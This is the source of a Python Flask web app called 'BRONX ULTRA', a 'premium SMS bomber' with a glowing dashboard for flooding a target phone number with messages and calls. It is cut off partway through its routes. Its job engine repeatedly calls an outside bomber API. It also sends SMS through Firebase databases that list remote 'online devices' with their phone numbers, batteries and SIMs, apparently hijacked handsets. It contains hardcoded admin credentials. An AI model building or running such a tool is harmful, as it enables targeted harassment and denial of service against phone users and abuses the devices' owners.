#!/usr/bin/env python3
"""
BRONX ULTRA - Premium SMS/Call Bomber Web Dashboard
- Custom SMS Mode (Firebase-based)
- Normal SMS + Call Mode (API-based)
- Admin Panel with Firebase management
- Glowing UI with premium vibes
"""

import os
import json
import asyncio
import sqlite3
import random
import string
import threading
import time
from datetime import datetime
from functools import wraps
from urllib.parse import urlparse

import httpx
from flask import (
    Flask, render_template_string, request, jsonify, session,
    redirect, url_for, flash
)
from werkzeug.security import generate_password_hash, check_password_hash

# ============ CONFIG ============
app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "bronx_ultra_secret_key_change_me_2024")

ADMIN_USERNAME = os.environ.get("ADMIN_USER", "bronx")
ADMIN_PASSWORD = os.environ.get("ADMIN_PASS", "85095613")

NORMAL_SMS_API = "https://bronx-fuck-sms-bomber.duckdns.org/send"
DEFAULT_COUNT = 100
MAX_CONCURRENT_REQUESTS = 50
DB_PATH = os.environ.get("DB_PATH", "bronx_ultra.db")

# Track running jobs (in-memory)
running_jobs = {}  # job_id -> {"stop": bool, "count": int, "sent": int, "mode": str}

# ============ DATABASE ============
def get_db():
    conn = sqlite3.connect(DB_PATH, timeout=15.0)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA busy_timeout=5000")
    return conn


def init_db():
    conn = get_db()
    c = conn.cursor()
    conn.execute("PRAGMA journal_mode=WAL")

    # Firebase storage
    c.execute("""
        CREATE TABLE IF NOT EXISTS firebases (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT NOT NULL,
            url TEXT NOT NULL,
            added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)

    # Jobs history
    c.execute("""
        CREATE TABLE IF NOT EXISTS jobs (
            id TEXT PRIMARY KEY,
            mode TEXT NOT NULL,
            number TEXT NOT NULL,
            message TEXT,
            target_count INTEGER,
            sent_count INTEGER DEFAULT 0,
            fail_count INTEGER DEFAULT 0,
            status TEXT DEFAULT 'running',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            finished_at TIMESTAMP
        )
    """)

    conn.commit()
    conn.close()


init_db()


# ============ FIREBASE HELPERS ============
async def get_online_devices(fb_url: str):
    """Get online devices from a Firebase Realtime DB."""
    base = fb_url.rstrip("/")
    if base.endswith(".json"):
        base = base[:-5]
    base = base.rstrip("/")
    clients_url = f"{base}/clients.json"
    try:
        async with httpx.AsyncClient(timeout=10.0) as client:
            resp = await client.get(clients_url)
            resp.raise_for_status()
            clients = resp.json()
    except Exception as e:
        print(f"Firebase error: {e}")
        return []

    if not isinstance(clients, dict):
        return []

    online = []
    for device_id, info in clients.items():
        if info.get("status") is True:
            online.append({
                "id": device_id,
                "name": info.get("modelName", device_id),
                "phone": info.get("mobNo", "N/A"),
                "battery": info.get("battery", "N/A"),
                "sims": info.get("sims", []),
            })
    return online


async def send_sms_via_firebase(fb_url: str, device_id: str, sim_index: int, target: str, message: str):
    """Send one SMS through a Firebase device."""
    payload = {
        "from": sim_index,
        "to": target,
        "message": message,
        "isSended": False,
        "timestamp": datetime.now().isoformat(),
    }
    url = f"{fb_url.rstrip('/')}/clients/{device_id}/webhookEvent/sendSms.json"
    try:
        async with httpx.AsyncClient(timeout=10.0) as client:
            resp = await client.put(url, json=payload)
            resp.raise_for_status()
        return True
    except Exception as e:
        print(f"SMS send failed: {e}")
        return False


# ============ JOB ENGINE ============
def run_custom_bomb(job_id: str, number: str, message: str, count: int):
    """Custom SMS bombing via Firebase."""
    job = running_jobs.get(job_id)
    if not job:
        return

    async def _run():
        conn = get_db()
        firebases = [dict(r) for r in conn.execute("SELECT * FROM firebases").fetchall()]
        conn.close()

        if not firebases:
            job["status"] = "failed"
            job["stop"] = True
            return

        # Collect all online devices
        all_devices = []
        for fb in firebases:
            devices = await get_online_devices(fb["url"])
            for d in devices:
                all_devices.append((fb["url"], d))

        if not all_devices:
            job["status"] = "failed"
            job["stop"] = True
            return

        sent = 0
        fail = 0
        dev_idx = 0

        while sent + fail < count and not job["stop"]:
            fb_url, dev = all_devices[dev_idx % len(all_devices)]
            dev_idx += 1
            sims = dev.get("sims", [])
            sim_index = 1 if sims else 1
            ok = await send_sms_via_firebase(fb_url, dev["id"], sim_index, number, message)
            if ok:
                sent += 1
                job["sent"] = sent
            else:
                fail += 1
                job["fail"] = fail
            # Small delay to be gentle
            await asyncio.sleep(0.1)

        job["status"] = "stopped" if job["stop"] else "completed"
        job["finished_at"] = datetime.now().isoformat()

        # Update DB
        conn = get_db()
        conn.execute(
            "UPDATE jobs SET sent_count=?, fail_count=?, status=?, finished_at=? WHERE id=?",
            (sent, fail, job["status"], job["finished_at"], job_id)
        )
        conn.commit()
        conn.close()

    asyncio.run(_run())


def run_normal_bomb(job_id: str, number: str, count: int):
    """Normal SMS/Call bombing via API."""
    job = running_jobs.get(job_id)
    if not job:
        return

    async def _run():
        sent = 0
        fail = 0
        async with httpx.AsyncClient(timeout=15.0) as client:
            while sent + fail < count and not job["stop"]:
                try:
                    url = f"{NORMAL_SMS_API}?number={number}&count=1"
                    resp = await client.get(url)
                    if resp.status_code == 200:
                        sent += 1
                        job["sent"] = sent
                    else:
                        fail += 1
                        job["fail"] = fail
                except Exception:
                    fail += 1
                    job["fail"] = fail
                await asyncio.sleep(0.15)

        job["status"] = "stopped" if job["stop"] else "completed"
        job["finished_at"] = datetime.now().isoformat()

        conn = get_db()
        conn.execute(
            "UPDATE jobs SET sent_count=?, fail_count=?, status=?, finished_at=? WHERE id=?",
            (sent, fail, job["status"], job["finished_at"], job_id)
        )
        conn.commit()
        conn.close()

    asyncio.run(_run())


# ============ AUTH HELPERS ============
def admin_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get("admin_logged_in"):
            return redirect(url_for("admin_login"))
        return f(*args, **kwargs)
    return decorated


# ============ HTML TEMPLATES (GLOWING UI) ============
BASE_STYLE = """
<style>
@import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@400;600;700&display=swap');

* { margin: 0; padding: 0; box-sizing: border-box; }

body {
    font-family: 'Rajdhani', sans-serif;
    background: #0a0a0f;
    color: #e0e0e0;
    min-height: 100vh;
    overflow-x: hidden;
    position: relative;
}

/* Animated background */
body::before {
    content: '';
    position: fixed;
    top: 0; left: 0; width: 100%; height: 100%;
    background:
        radial-gradient(circle at 20% 20%, rgba(255, 0, 128, 0.15) 0%, transparent 40%),
        radial-gradient(circle at 80% 80%, rgba(0, 200, 255, 0.15) 0%, transparent 40%),
        radial-gradient(circle at 50% 50%, rgba(150, 0, 255, 0.08) 0%, transparent 60%);
    z-index: -2;
    animation: bgPulse 8s ease-in-out infinite alternate;
}

@keyframes bgPulse {
    0% { opacity: 0.6; }
    100% { opacity: 1; }
}

/* Grid overlay */
body::after {
    content: '';
    position: fixed;
    top: 0; left: 0; width: 100%; height: 100%;
    background-image:
        linear-gradient(rgba(0, 200, 255, 0.03) 1px, transparent 1px),
        linear-gradient(90deg, rgba(0, 200, 255, 0.03) 1px, transparent 1px);
    background-size: 50px 50px;
    z-index: -1;
    pointer-events: none;
}

.container {
    max-width: 900px;
    margin: 0 auto;
    padding: 20px;
}

/* Header */
.header {
    text-align: center;
    padding: 30px 0;
    position: relative;
}

.logo-title {
    font-family: 'Orbitron', sans-serif;
    font-weight: 900;
    font-size: clamp(28px, 6vw, 48px);
    letter-spacing: 3px;
    background: linear-gradient(90deg, #ff0080, #7928ca, #00c8ff);
    -webkit-background-clip: text;
    background-clip: text;
    -webkit-text-fill-color: transparent;
    filter: drop-shadow(0 0 20px rgba(255, 0, 128, 0.5));
    animation: titleGlow 3s ease-in-out infinite alternate;
    margin-bottom: 8px;
}

@keyframes titleGlow {
    0% { filter: drop-shadow(0 0 15px rgba(255, 0, 128, 0.4)); }
    100% { filter: drop-shadow(0 0 30px rgba(0, 200, 255, 0.6)); }
}

.subtitle {
    font-size: 14px;
    color: #888;
    letter-spacing: 4px;
    text-transform: uppercase;
}

/* Glowing card */
.glow-card {
    background: rgba(15, 15, 25, 0.85);
    border: 1px solid rgba(0, 200, 255, 0.2);
    border-radius: 16px;
    padding: 24px;
    margin: 20px 0;
    position: relative;
    backdrop-filter: blur(10px);
    box-shadow:
        0 0 20px rgba(0, 200, 255, 0.08),
        inset 0 1px 0 rgba(255, 255, 255, 0.05);
    transition: all 0.3s ease;
}

.glow-card:hover {
    border-color: rgba(255, 0, 128, 0.4);
    box-shadow:
        0 0 30px rgba(255, 0, 128, 0.15),
        0 0 20px rgba(0, 200, 255, 0.1),
        inset 0 1px 0 rgba(255, 255, 255, 0.05);
}

/* Tabs */
.tabs {
    display: flex;
    gap: 10px;
    margin-bottom: 20px;
    background: rgba(0, 0, 0, 0.3);
    padding: 6px;
    border-radius: 12px;
    border: 1px solid rgba(255, 255, 255, 0.05);
}

.tab {
    flex: 1;
    padding: 14px 20px;
    text-align: center;
    border-radius: 8px;
    cursor: pointer;
    font-weight: 700;
    font-size: 14px;
    letter-spacing: 1px;
    text-transform: uppercase;
    color: #888;
    transition: all 0.3s ease;
    border: 1px solid transparent;
    user-select: none;
}

.tab:hover {
    color: #fff;
    background: rgba(255, 255, 255, 0.03);
}

.tab.active {
    color: #fff;
    background: linear-gradient(135deg, rgba(255, 0, 128, 0.2), rgba(0, 200, 255, 0.2));
    border-color: rgba(0, 200, 255, 0.4);
    box-shadow: 0 0 15px rgba(0, 200, 255, 0.2);
}

/* Form */
.form-group {
    margin-bottom: 20px;
}

.form-label {
    display: block;
    font-size: 13px;
    font-weight: 600;
    color: #00c8ff;
    margin-bottom: 8px;
    text-transform: uppercase;
    letter-spacing: 2px;
}

.form-input {
    width: 100%;
    padding: 14px 18px;
    background: rgba(0, 0, 0, 0.4);
    border: 1px solid rgba(0, 200, 255, 0.25);
    border-radius: 10px;
    color: #fff;
    font-family: 'Rajdhani', sans-serif;
    font-size: 16px;
    font-weight: 600;
    outline: none;
    transition: all 0.3s ease;
}

.form-input:focus {
    border-color: #00c8ff;
    box-shadow: 0 0 20px rgba(0, 200, 255, 0.3);
    background: rgba(0, 0, 0, 0.6);
}

.form-input::placeholder {
    color: #555;
    font-weight: 400;
}

.input-group {
    display: flex;
    align-items: center;
    background: rgba(0, 0, 0, 0.4);
    border: 1px solid rgba(0, 200, 255, 0.25);
    border-radius: 10px;
    overflow: hidden;
    transition: all 0.3s ease;
}

.input-group:focus-within {
    border-color: #00c8ff;
    box-shadow: 0 0 20px rgba(0, 200, 255, 0.3);
}

.input-prefix {
    padding: 14px 18px;
    background: rgba(0, 200, 255, 0.1);
    color: #00c8ff;
    font-weight: 700;
    font-size: 16px;
    border-right: 1px solid rgba(0, 200, 255, 0.2);
    white-space: nowrap;
}

.input-group .form-input {
    border: none;
    background: transparent;
    box-shadow: none;
    border-radius: 0;
}

/* Buttons */
.btn {
    width: 100%;
    padding: 16px;
    border: none;
    border-radius: 10px;
    font-family: 'Orbitron', sans-serif;
    font-size: 15px;
    font-weight: 700;
    letter-spacing: 2px;
    text-transform: uppercase;
    cursor: pointer;
    transition: all 0.3s ease;
    position: relative;
    overflow: hidden;
}

.btn-primary {
    background: linear-gradient(135deg, #ff0080, #7928ca);
    color: #fff;
    box-shadow: 0 0 25px rgba(255, 0, 128, 0.4);
}

.btn-primary:hover:not(:disabled) {
    box-shadow: 0 0 40px rgba(255, 0, 128, 0.7);
    transform: translateY(-2px);
}

.btn-danger {
    background: linear-gradient(135deg, #ff0055, #ff0000);
    color: #fff;
    box-shadow: 0 0 25px rgba(255, 0, 0, 0.4);
}

.btn-danger:hover:not(:disabled) {
    box-shadow: 0 0 40px rgba(255, 0, 0, 0.7);
    transform: translateY(-2px);
}

.btn-secondary {
    background: rgba(0, 200, 255, 0.1);
    color: #00c8ff;
    border: 1px solid rgba(0, 200, 255, 0.4);
}

.btn-secondary:hover:not(:disabled) {
    background: rgba(0, 200, 255, 0.2);
    box-shadow: 0 0 20px rgba(0, 200, 255, 0.3);
}

.btn:disabled {
    opacity: 0.5;
    cursor: not-allowed;
}

/* Stats */
.stats-box {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 12px;
    margin: 16px 0;
}

.stat {
    background: rgba(0, 0, 0, 0.4);
    border: 1px solid rgba(0, 200, 255, 0.15);
    border-radius: 10px;
    padding: 14px;
    text-align: center;
}

.stat-value {
    font-family: 'Orbitron', sans-serif;
    font-size: 24px;
    font-weight: 700;
    color: #00c8ff;
    text-shadow: 0 0 15px rgba(0, 200, 255, 0.5);
}

.stat-label {
    font-size: 11px;
    color: #666;
    text-transform: uppercase;
    letter-spacing: 2px;
    margin-top: 4px;
}

/* Progress bar */
.progress-container {
    width: 100%;
    height: 24px;
    background: rgba(0, 0, 0, 0.5);
    border-radius: 12px;
    border: 1px solid rgba(0, 200, 255, 0.2);
    overflow: hidden;
    margin: 12px 0;
    position: relative;
}

.progress-bar {
    height: 100%;
    background: linear-gradient(90deg, #ff0080, #7928ca, #00c8ff);
    background-size: 200% 100%;
    animation: progressShift 2s linear infinite;
    transition: width 0.3s ease;
    box-shadow: 0 0 20px rgba(0, 200, 255, 0.5);
}

@keyframes progressShift {
    0% { background-position: 0% 50%; }
    100% { background-position: 200% 50%; }
}

.progress-text {
    position: absolute;
    top: 50%; left: 50%;
    transform: translate(-50%, -50%);
    font-family: 'Orbitron', sans-serif;
    font-weight: 700;
    font-size: 12px;
    color: #fff;
    text-shadow: 0 0 10px rgba(0, 0, 0, 0.8);
}

/* Status messages */
.alert {
    padding: 14px 18px;
    border-radius: 10px;
    margin: 16px 0;
    font-weight: 600;
    border: 1px solid;
}

.alert-success {
    background: rgba(0, 255, 136, 0.1);
    border-color: rgba(0, 255, 136, 0.4);
    color: #00ff88;
}

.alert-error {
    background: rgba(255, 0, 0, 0.1);
    border-color: rgba(255, 0, 0, 0.4);
    color: #ff5555;
}

.alert-info {
    background: rgba(0, 200, 255, 0.1);
    border-color: rgba(0, 200, 255, 0.4);
    color: #00c8ff;
}

/* Hide elements utility */
.hidden { display: none !important; }

/* Admin link */
.admin-link {
    text-align: center;
    margin-top: 30px;
    padding: 20px;
    font-size: 13px;
}

.admin-link a {
    color: #555;
    text-decoration: none;
    letter-spacing: 2px;
    transition: color 0.3s;
}

.admin-link a:hover {
    color: #00c8ff;
    text-shadow: 0 0 10px rgba(0, 200, 255, 0.5);
}

/* Firebase list */
.fb-item {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 14px 18px;
    background: rgba(0, 0, 0, 0.4);
    border: 1px solid rgba(0, 200, 255, 0.15);
    border-radius: 10px;
    margin-bottom: 10px;
}

.fb-item:hover {
    border-color: rgba(0, 200, 255, 0.4);
}

.fb-info {
    flex: 1;
    min-width: 0;
}

.fb-name {
    font-weight: 700;
    color: #00c8ff;
    font-size: 15px;
}

.fb-url {
    font-size: 12px;
    color: #666;
    word-break: break-all;
    margin-top: 4px;
}

.fb-delete {
    background: rgba(255, 0, 0, 0.15);
    border: 1px solid rgba(255, 0, 0, 0.4);
    color: #ff5555;
    padding: 8px 14px;
    border-radius: 8px;
    cursor: pointer;
    font-weight: 700;
    font-size: 12px;
    transition: all 0.3s;
    margin-left: 12px;
}

.fb-delete:hover {
    background: rgba(255, 0, 0, 0.3);
    box-shadow: 0 0 15px rgba(255, 0, 0, 0.4);
}

/* Login */
.login-container {
    max-width: 400px;
    margin: 100px auto;
    padding: 20px;
}

/* Animation for particles */
.floating {
    animation: float 6s ease-in-out infinite;
}

@keyframes float {
    0%, 100% { transform: translateY(0); }
    50% { transform: translateY(-10px); }
}

@media (max-width: 600px) {
    .container { padding: 12px; }
    .glow-card { padding: 18px; }
    .tabs { flex-direction: column; }
    .logo-title { letter-spacing: 1px; }
}
</style>
"""


DASHBOARD_HTML = BASE_STYLE + """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BRONX ULTRA - Premium Bomber</title>
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
</head>
<body>
<div class="container">
    <div class="header floating">
        <div class="logo-title">BRONX ULTRA</div>
        <div class="subtitle">PREMIUM SMS BOMBER</div>
    </div>

    <div class="glow-card">
        <div class="tabs">
            <div class="tab active" data-tab="custom">💣 Custom SMS</div>
            <div class="tab" data-tab="normal">📞 SMS + Call</div>
        </div>

        <!-- Custom SMS Mode -->
        <div id="tab-custom" class="tab-content">
            <div class="form-group">
                <label class="form-label">📱 Target Number</label>
                <div class="input-group">
                    <span class="input-prefix">+91</span>
                    <input type="tel" id="custom-number" class="form-input"
                           placeholder="9876543210" maxlength="10" inputmode="numeric">
                </div>
            </div>

            <div class="form-group">
                <label class="form-label">💬 Custom Message</label>
                <input type="text" id="custom-message" class="form-input"
                       placeholder="Enter message to send...">
            </div>

            <div class="form-group">
                <label class="form-label">🔢 Count (How many to send)</label>
                <input type="number" id="custom-count" class="form-input"
                       placeholder="100" value="100" min="1" max="1000">
            </div>

            <button class="btn btn-primary" id="btn-start-custom">🚀 START BOMBING</button>
            <button class="btn btn-danger hidden" id="btn-stop-custom" style="margin-top:10px;">⛔ STOP</button>

            <div id="custom-progress" class="hidden">
                <div class="stats-box">
                    <div class="stat">
                        <div class="stat-value" id="custom-sent">0</div>
                        <div class="stat-label">Sent</div>
                    </div>
                    <div class="stat">
                        <div class="stat-value" id="custom-fail">0</div>
                        <div class="stat-label">Failed</div>
                    </div>
                </div>
                <div class="progress-container">
                    <div class="progress-bar" id="custom-bar" style="width:0%"></div>
                    <div class="progress-text" id="custom-pct">0%</div>
                </div>
            </div>
        </div>

        <!-- Normal SMS + Call Mode -->
        <div id="tab-normal" class="tab-content hidden">
            <div class="form-group">
                <label class="form-label">📱 Target Number</label>
                <div class="input-group">
                    <span class="input-prefix">+91</span>
                    <input type="tel" id="normal-number" class="form-input"
                           placeholder="9876543210" maxlength="10" inputmode="numeric">
                </div>
            </div>

            <div class="form-group">
                <label class="form-label">🔢 Count</label>
                <input type="number" id="normal-count" class="form-input"
                       placeholder="100" value="100" min="1" max="1000">
            </div>

            <button class="btn btn-primary" id="btn-start-normal">🚀 START BOMBING</button>
            <button class="btn btn-danger hidden" id="btn-stop-normal" style="margin-top:10px;">⛔ STOP</button>

            <div id="normal-progress" class="hidden">
                <div class="stats-box">
                    <div class="stat">
                        <div class="stat-value" id="normal-sent">0</div>
                        <div class="stat-label">Sent</div>
                    </div>
                    <div class="stat">
                        <div class="stat-value" id="normal-fail">0</div>
                        <div class="stat-label">Failed</div>
                    </div>
                </div>
                <div class="progress-container">
                    <div class="progress-bar" id="normal-bar" style="width:0%"></div>
                    <div class="progress-text" id="normal-pct">0%</div>
                </div>
            </div>
        </div>

        <div id="alert-box"></div>
    </div>

    <div class="admin-link">
        <a href="/bronx-admin-panel">🔐 ADMIN PANEL</a>
    </div>
</div>

<script>
// Tab switching
$('.tab').on('click', function() {
    $('.tab').removeClass('active');
    $(this).addClass('active');
    const tab = $(this).data('tab');
    $('.tab-content').addClass('hidden');
    $('#tab-' + tab).removeClass('hidden');
});

function showAlert(msg, type) {
    $('#alert-box').html('<div class="alert alert-' + type + '">' + msg + '</div>');
    setTimeout(() => $('#alert-box').html(''), 5000);
}

let currentJob = { custom: null, normal: null };
let pollIntervals = { custom: null, normal: null };

function pollStatus(mode, jobId, total) {
    if (pollIntervals[mode]) clearInterval(pollIntervals[mode]);
    pollIntervals[mode] = setInterval(() => {
        $.get('/api/job-status/' + jobId, function(data) {
            const sent = data.sent || 0;
            const fail = data.fail || 0;
            const done = sent + fail;
            const pct = total > 0 ? Math.min(100, Math.floor((done / total) * 100)) : 0;

            $('#' + mode + '-sent').text(sent);
            $('#' + mode + '-fail').text(fail);
            $('#' + mode + '-bar').css('width', pct + '%');
            $('#' + mode + '-pct').text(pct + '%');

            if (data.status === 'completed' || data.status === 'stopped' || data.status === 'failed') {
                clearInterval(pollIntervals[mode]);
                pollIntervals[mode] = null;
                currentJob[mode] = null;
                $('#' + mode + '-progress').addClass('hidden');
                $('#btn-start-' + mode).removeClass('hidden');
                $('#btn-stop-' + mode).addClass('hidden');
                if (data.status === 'completed') {
                    showAlert('✅ Bombing completed! Sent: ' + sent + ' | Failed: ' + fail, 'success');
                } else if (data.status === 'stopped') {
                    showAlert('⛔ Bombing stopped. Sent: ' + sent + ' | Failed: ' + fail, 'info');
                } else {
                    showAlert('❌ Bombing failed!', 'error');
                }
            }
        });
    }, 800);
}

// Custom SMS
$('#btn-start-custom').on('click', function() {
    const number = $('#custom-number').val().trim();
    const message = $('#custom-message').val().trim();
    const count = parseInt($('#custom-count').val()) || 100;

    if (!number || number.length < 10) {
        showAlert('❌ Enter a valid 10-digit number', 'error');
        return;
    }
    if (!message) {
        showAlert('❌ Enter a message', 'error');
        return;
    }
    if (count < 1) {
        showAlert('❌ Count must be at least 1', 'error');
        return;
    }

    $('#btn-start-custom').addClass('hidden');
    $('#btn-stop-custom').removeClass('hidden');
    $('#custom-progress').removeClass('hidden');
    $('#custom-sent').text('0');
    $('#custom-fail').text('0');
    $('#custom-bar').css('width', '0%');
    $('#custom-pct').text('0%');

    $.post('/api/start-custom', {
        number: '+91' + number,
        message: message,
        count: count
    }, function(data) {
        if (data.success) {
            currentJob.custom = data.job_id;
            pollStatus('custom', data.job_id, count);
        } else {
            showAlert('❌ ' + data.error, 'error');
            $('#btn-start-custom').removeClass('hidden');
            $('#btn-stop-custom').addClass('hidden');
            $('#custom-progress').addClass('hidden');
        }
    }).fail(function() {
        showAlert('❌ Server error', 'error');
        $('#btn-start-custom').removeClass('hidden');
        $('#btn-stop-custom').addClass('hidden');
        $('#custom-progress').addClass('hidden');
    });
});

$('#btn-stop-custom').on('click', function() {
    if (!currentJob.custom) return;
    $.post('/api/stop-job/' + currentJob.custom, function(data) {
        if (data.success) {
            showAlert('⛔ Stopping...', 'info');
        }
    });
});

// Normal SMS
$('#btn-start-normal').on('click', function() {
    const number = $('#normal-number').val().trim();
    const count = parseInt($('#normal-count').val()) || 100;

    if (!number || number.length < 10) {
        showAlert('❌ Enter a valid 10-digit number', 'error');
        return;
    }
    if (count < 1) {
        showAlert('❌ Count must be at least 1', 'error');
        return;
    }

    $('#btn-start-normal').addClass('hidden');
    $('#btn-stop-normal').removeClass('hidden');
    $('#normal-progress').removeClass('hidden');
    $('#normal-sent').text('0');
    $('#normal-fail').text('0');
    $('#normal-bar').css('width', '0%');
    $('#normal-pct').text('0%');

    $.post('/api/start-normal', {
        number: '+91' + number,
        count: count
    }, function(data) {
        if (data.success) {
            currentJob.normal = data.job_id;
            pollStatus('normal', data.job_id, count);
        } else {
            showAlert('❌ ' + data.error, 'error');
            $('#btn-start-normal').removeClass('hidden');
            $('#btn-stop-normal').addClass('hidden');
            $('#normal-progress').addClass('hidden');
        }
    }).fail(function() {
        showAlert('❌ Server error', 'error');
        $('#btn-start-normal').removeClass('hidden');
        $('#btn-stop-normal').addClass('hidden');
        $('#normal-progress').addClass('hidden');
    });
});

$('#btn-stop-normal').on('click', function() {
    if (!currentJob.normal) return;
    $.post('/api/stop-job/' + currentJob.normal, function(data) {
        if (data.success) {
            showAlert('⛔ Stopping...', 'info');
        }
    });
});

// Number input validation
$('#custom-number, #normal-number').on('input', function() {
    this.value = this.value.replace(/\D/g, '').slice(0, 10);
});
</script>
</body>
</html>
"""


ADMIN_LOGIN_HTML = BASE_STYLE + """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bronx Ultra - Admin Login</title>
</head>
<body>
<div class="login-container">
    <div class="header" style="padding: 20px 0;">
        <div class="logo-title" style="font-size: 32px;">ADMIN ACCESS</div>
        <div class="subtitle">BRONX ULTRA PANEL</div>
    </div>

    <div class="glow-card">
        {% with messages = get_flashed_messages(with_categories=true) %}
            {% for category, message in messages %}
                <div class="alert alert-{{ 'error' if category == 'error' else 'success' }}">{{ message }}</div>
            {% endfor %}
        {% endwith %}

        <form method="POST">
            <div class="form-group">
                <label class="form-label">👤 Username</label>
                <input type="text" name="username" class="form-input" placeholder="Enter username" required autofocus>
            </div>
            <div class="form-group">
                <label class="form-label">🔑 Password</label>
                <input type="password" name="password" class="form-input" placeholder="Enter password" required>
            </div>
            <button type="submit" class="btn btn-primary">🔓 LOGIN</button>
        </form>
    </div>

    <div class="admin-link">
        <a href="/">← Back to Dashboard</a>
    </div>
</div>
</body>
</html>
"""


ADMIN_PANEL_HTML = BASE_STYLE + """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bronx Ultra - Admin Panel</title>
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
</head>
<body>
<div class="container">
    <div class="header floating">
        <div class="logo-title" style="font-size: 32px;">⚙️ ADMIN PANEL</div>
        <div class="subtitle">BRONX ULTRA CONTROL CENTER</div>
    </div>

    <div class="glow-card">
        <h2 style="color: #00c8ff; font-family: Orbitron; margin-bottom: 20px; font-size: 18px;">
            📡 FIREBASE DATABASES
        </h2>

        <div class="form-group">
            <label class="form-label">Firebase Name</label>
            <input type="text" id="fb-name" class="form-input" placeholder="e.g., Server 1">
        </div>
        <div class="form-group">
            <label class="form-label">Firebase URL</label>
            <input type="url" id="fb-url" class="form-input"
                   placeholder="https://your-project.firebaseio.com">
        </div>
        <button class="btn btn-primary" id="btn-add-fb">➕ ADD FIREBASE</button>

        <div id="fb-alert" style="margin-top: 16px;"></div>

        <div style="margin-top: 24px;">
            <label class="form-label">📋 Configured Firebases</label>
            <div id="fb-list">
                {% for fb in firebases %}
                <div class="fb-item" data-id="{{ fb.id }}">
                    <div class="fb-info">
                        <div class="fb-name">{{ fb.name }}</div>
                        <div class="fb-url">{{ fb.url }}</div>
                    </div>
                    <button class="fb-delete" onclick="deleteFb({{ fb.id }})">🗑 DELETE</button>
                </div>
                {% else %}
                <p style="color: #666; text-align: center; padding: 20px;">No firebases configured yet.</p>
                {% endfor %}
            </div>
        </div>
    </div>

    <div class="glow-card">
        <h2 style="color: #00c8ff; font-family: Orbitron; margin-bottom: 20px; font-size: 18px;">
            📊 RECENT JOBS
        </h2>
        <div style="overflow-x: auto;">
            <table style="width: 100%; border-collapse: collapse; font-size: 13px;">
                <thead>
                    <tr style="border-bottom: 1px solid rgba(0,200,255,0.3);">
                        <th style="text-align: left; padding: 10px; color: #00c8ff;">ID</th>
                        <th style="text-align: left; padding: 10px; color: #00c8ff;">Mode</th>
                        <th style="text-align: left; padding: 10px; color: #00c8ff;">Number</th>
                        <th style="text-align: left; padding: 10px; color: #00c8ff;">Sent</th>
                        <th style="text-align: left; padding: 10px; color: #00c8ff;">Status</th>
                    </tr>
                </thead>
                <tbody>
                    {% for job in jobs %}
                    <tr style="border-bottom: 1px solid rgba(255,255,255,0.05);">
                        <td style="padding: 10px; font-family: monospace; color: #888;">{{ job.id[:8] }}</td>
                        <td style="padding: 10px;">{{ '💣 Custom' if job.mode == 'custom' else '📞 Normal' }}</td>
                        <td style="padding: 10px; color: #fff;">{{ job.number }}</td>
                        <td style="padding: 10px; color: #00c8ff;">{{ job.sent_count }}/{{ job.target_count }}</td>
                        <td style="padding: 10px;">
                            {% if job.status == 'completed' %}
                                <span style="color: #00ff88;">✅ {{ job.status }}</span>
                            {% elif job.status == 'running' %}
                                <span style="color: #00c8ff;">🔄 {{ job.status }}</span>
                            {% elif job.status == 'stopped' %}
                                <span style="color: #ffaa00;">⛔ {{ job.status }}</span>
                            {% else %}
                                <span style="color: #ff5555;">❌ {{ job.status }}</span>
                            {% endif %}
                        </td>
                    </tr>
                    {% else %}
                    <tr>
                        <td colspan="5" style="padding: 20px; text-align: center; color: #666;">No jobs yet</td>
                    </tr>
                    {% endfor %}
                </tbody>
            </table>
        </div>
    </div>

    <div class="glow-card" style="border-color: rgba(255,0,0,0.2);">
        <a href="/bronx-admin-panel/logout" class="btn btn-danger"
           style="text-decoration: none; display: block; text-align: center;">
            🚪 LOGOUT
        </a>
    </div>
</div>

<script>
function showFbAlert(msg, type) {
    const cls = type === 'error' ? 'alert-error' : 'alert-success';
    $('#fb-alert').html('<div class="alert ' + cls + '">' + msg + '</div>');
    setTimeout(() => $('#fb-alert').html(''), 5000);
}

$('#btn-add-fb').on('click', function() {
    const name = $('#fb-name').val().trim();
    const url = $('#fb-url').val().trim();
    if (!name || !url) {
        showFbAlert('❌ Fill both fields', 'error');
        return;
    }
    if (!url.startsWith('http')) {
        showFbAlert('❌ URL must start with http/https', 'error');
        return;
    }

    $('#btn-add-fb').prop('disabled', true).text('⏳ TESTING...');

    $.post('/bronx-admin-panel/add-firebase', {
        name: name,
        url: url
    }, function(data) {
        if (data.success) {
            showFbAlert('✅ Firebase added successfully!', 'success');
            setTimeout(() => location.reload(), 1000);
        } else {
            showFbAlert('❌ ' + data.error, 'error');
            $('#btn-add-fb').prop('disabled', false).text('➕ ADD FIREBASE');
        }
    }).fail(function() {
        showFbAlert('❌ Server error', 'error');
        $('#btn-add-fb').prop('disabled', false).text('➕ ADD FIREBASE');
    });
});

function deleteFb(id) {
    if (!confirm('Delete this Firebase?')) return;
    $.post('/bronx-admin-panel/delete-firebase/' + id, function(data) {
        if (data.success) {
            location.reload();
        } else {
            alert('Error: ' + data.error);
        }
    });
}
</script>
</body>
</html>
"""


# ============ ROUTES ============
@app.route("/")
def index():
    return render_template_string(DASHBOARD_HTML)


@app.route("/api/start-custom", methods=["POST"])
def api_start_custom():
    number = request.form.get("number", "").strip()
    message = request.form.get("message", "").strip()
    try:
        count = int(request.form.get("count", 100))
    except ValueError:
        return jsonify({"success": False, "error": "Invalid count"})

    if not number or len(number) < 10:
